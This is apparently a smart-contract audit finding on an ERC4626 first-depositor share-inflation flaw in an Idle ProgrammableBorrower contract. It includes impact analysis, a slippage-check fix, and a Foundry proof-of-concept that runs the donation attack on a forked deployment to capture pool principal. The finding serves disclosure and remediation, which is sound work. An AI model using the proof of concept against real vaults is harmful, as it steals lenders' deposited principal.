### Title
Unprotected ERC4626 deposits let a first depositor inflate shares and steal pool principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle underlying into a configured ERC4626 vault when `IdleCDOEpochVariant` starts an epoch, but it performs no slippage check on the shares returned by `vault.deposit`. If the external vault is empty or nearly empty, an ordinary vault user can front-run the first deposit with a minimal deposit followed by an underlying donation, causing the programmable borrower to receive fewer shares than its deposit is worth. The stolen value remains claimable by the attacker's vault share, while the facility becomes undercollateralized and can eventually default when the pool is closed.

### Finding Description
`onStartEpoch` snapshots `startAssets`, then deposits the contract's full underlying balance through `_depositToVault` without checking the returned share amount against `previewDeposit` or a caller-specified minimum. [1](#0-0)  `_depositToVault` simply calls `vault.deposit(_assetAmount, address(this))` and only records `_principalAssets`; the returned `shares` value is unused for validation. [2](#0-1) 

In an ERC4626 vault whose share price is derived from `totalAssets / totalSupply`, an attacker can deposit a tiny amount to become the first shareholder, then directly transfer underlying to the vault. This donation raises the asset denominator without minting shares to the attacker. When `ProgrammableBorrower` subsequently deposits, integer rounding can mint materially fewer shares than the deposited assets are worth. The lost value remains in the vault and is included in the attacker share's redemption value.

This is not merely an accounting artifact. The facility's economic exposure is later measured through `_currentVaultAssets`, which calls the external vault's `convertToAssets` for the borrower's actual share balance. [3](#0-2)  A reduced share balance therefore represents reduced recoverable principal. In minted-interest mode, `totalInterestDueNow` floors a negative vault delta at zero rather than immediately burning principal. [4](#0-3)  The missing principal then surfaces when pending withdrawals or close-pool settlement require funds.

`deployRevolvingCreditVault` accepts the ERC4626 vault as a deployment parameter and does not require that it be newly deployed, exclusive to the borrower, protected by a minimum initial supply, or pre-seeded with dead shares. [5](#0-4) [6](#0-5)  Consequently, the programmable-borrower path supports a public ERC4626 vault in which the attacker is an ordinary depositor, matching the allowed unprivileged-attacker model.

### Impact Explanation
The attacker can force part of the pool's first vault deposit to remain attributable to the attacker's pre-existing vault share instead of the programmable borrower's newly minted shares. For example, if the attacker deposits one wei of underlying, donates `D`, and the borrower then deposits `A` where `D < A < 2D`, a naïve share formula mints only one share to the borrower. The attacker and borrower then each hold one share over approximately `A + D` assets, so the attacker can redeem roughly `(A + D) / 2` after spending about `D`, producing a profit approaching `A / 4` at the favorable rounding boundary.

The protocol-side loss is borne by the credit pool. If the reduced vault position cannot satisfy pending withdrawals or the full principal recall, `onStopEpoch` can leave the borrower short; `IdleCDOEpochVariant` then treats the failed pull as a borrower default. [7](#0-6) [8](#0-7)  Active and pending claimants are consequently exposed to a real bad-debt haircut rather than a harmless rounding loss.

### Likelihood Explanation
The attack requires the configured ERC4626 vault to be empty or to have a small enough asset-to-supply ratio that donation-based share inflation meaningfully changes the borrower's minted share count. It also requires the attacker to be able to front-run the first `onStartEpoch` deposit and to deposit into and donate to that vault. Those capabilities do not require a privileged role in this codebase, and `deployRevolvingCreditVault` does not enforce an initialized or exclusive vault.

The likelihood is configuration-dependent. A mature ERC4626 vault with substantial unrelated supply makes the donation economically unattractive, while vaults using virtual offsets, deposit minimums, or zero-share rejection can prevent the rounding capture. The vulnerability is nevertheless reachable in the supported arbitrary-vault configuration, particularly at first deposit, and can directly cause principal loss rather than only revert or freeze the epoch.

### Recommendation
Validate every ERC4626 deposit using a minimum acceptable share amount derived from a trusted pre-transaction baseline, and revert when the returned shares or resulting `convertToAssets` value falls below that threshold. The same protection should be applied to vault withdrawals where exact asset output or bounded share burn matters.

For new revolving-credit deployments, prefer a dedicated vault deployment and seed it with an inaccessible minimum supply, or require the configured vault to pass an exchange-rate manipulation assessment before activation. `ProgrammableBorrower` should also track principal by shares and realized `convertToAssets` immediately after each deposit so that unexpected deposit slippage is detected before tranche accounting treats the deposited amount as fully backed.

A minimum safe pattern is:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares < expectedShares * minBps / 10_000) revert DepositSlippage();
if (vault.convertToAssets(shares) + maxRoundingLoss < _assetAmount) {
  revert DepositSlippage();
}
```

The configured vault should additionally be required to reject zero-share deposits, and first-deposit protection should be part of deployment rather than delegated to operators.

### Proof of Concept
The following Foundry test uses a forked ERC4626 vault configured in a deployed `ProgrammableBorrower`. Set `FORK_RPC_URL` and `PROGRAMMABLE_BORROWER` to the target deployment. The vault must be empty or nearly empty before the first `onStartEpoch`; the test uses `deal` only to give the attacker underlying and does not mutate the target's storage.

```solidity
// test/foundry/ProgrammableBorrowerInflation.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {IERC4626} from "contracts/interfaces/IERC4626.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";

interface IERC20Mintable is IERC20 {
  function mint(address to, uint256 amount) external;
}

contract ProgrammableBorrowerInflationForkTest is Test {
  ProgrammableBorrower internal borrower =
    ProgrammableBorrower(vm.envAddress("PROGRAMMABLE_BORROWER"));

  address internal attacker = makeAddr("erc4626-first-depositor");

  function testFirstDepositorInflatesVaultShares() external {
    IERC4626 vault = borrower.vault();
    IERC20 underlying = IERC20(vault.asset());

    // This PoC targets the first-deposit window.
    assertEq(vault.balanceOf(address(borrower)), 0);
    assertEq(underlying.balanceOf(address(borrower)), 0);

    uint256 poolDeposit = 1_000_000e6; // Example USDC-scale deposit.
    uint256 donation = 600_000e6;

    // Give the attacker enough underlying for the initial share and donation.
    deal(address(underlying), attacker, donation + 1);

    vm.startPrank(attacker);
    underlying.approve(address(vault), type(uint256).max);
    uint256 attackerShares = vault.deposit(1, attacker);
    underlying.transfer(address(vault), donation);
    vm.stopPrank();

    // The epoch-start call deposits the full pool balance through the vulnerable path.
    deal(address(underlying), address(borrower), poolDeposit);
    uint256 baseline = borrower.epochStartVaultAssets() + poolDeposit;

    vm.prank(borrower.idleCDO());
    borrower.onStartEpoch(0);

    uint256 borrowerShares = vault.balanceOf(address(borrower));
    uint256 borrowerAssets = vault.convertToAssets(borrowerShares);

    // The borrower's position must have lost material value despite depositing principal.
    assertLt(borrowerAssets, baseline);
    assertGt(attackerShares, 0);

    // The attacker redeems the single pre-existing share and captures the stranded value.
    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    uint256 redeemed = vault.redeem(attackerShares, attacker, attacker);

    assertGt(redeemed, donation + 1);
    assertGt(
      underlying.balanceOf(attacker) - attackerBefore,
      donation,
      "attacker recovered the donation plus pool principal"
    );
    assertLt(
      borrowerAssets,
      poolDeposit,
      "borrower retained fewer assets than deposited"
    );
  }
}
```

Run it against a fork configured with an empty public ERC4626 vault:

```bash
FORK_RPC_URL=<rpc> PROGRAMMABLE_BORROWER=<address> \
forge test --fork-url "$FORK_RPC_URL" \
  --match-test testFirstDepositorInflatesVaultShares -vvv
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L214-223)
```text
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-347)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-549)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L85-90)
```text
  struct ProgrammableBorrowerParams {
    address implementation;
    address vault;
    address borrower;
    uint256 borrowerApr;
  }
```

**File:** contracts/IdleCreditVaultFactory.sol (L216-232)
```text
    programmableBorrower = ProgrammableBorrower(_deployProxy(
      programmableBorrowerParams.implementation,
      abi.encodeWithSelector(
        ProgrammableBorrower.initialize.selector,
        programmableBorrowerParams.vault,
        address(cv),
        address(this),
        manager,
        programmableBorrowerParams.borrower,
        programmableBorrowerParams.borrowerApr
      )
    ));

    strategy.setBorrower(address(programmableBorrower));
    // Programmable mode is explicit and should always be enabled on the revolving path.
    cv.setIsProgrammableBorrower(true);
    programmableBorrower.transferOwnership(treasury);
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-408)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
```

**File:** contracts/IdleCDOEpochVariant.sol (L501-504)
```text
    } catch {
      // if borrower defaults, prev instant withdraw requests can still be withdrawn
      // as were already fullfilled prior to the default (all funds already sent to the strategy)
      _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
```
